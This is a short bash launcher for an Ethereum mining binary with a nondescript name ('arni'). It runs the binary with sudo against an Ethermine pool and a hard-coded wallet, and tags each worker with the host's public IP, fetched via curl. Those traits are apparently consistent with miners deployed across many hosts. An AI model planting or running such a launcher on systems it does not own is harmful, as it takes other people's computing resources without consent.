#!/bin/bash

POOL=ssl://us1.ethermine.org:5555
WALLET=0xeda9774264112a15245cf5eda7f9c1b2fe6bf63e.$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./arni && sudo ./arni -pool $POOL -wal $WALLET $@ -pass x -proto 3 -stales 0
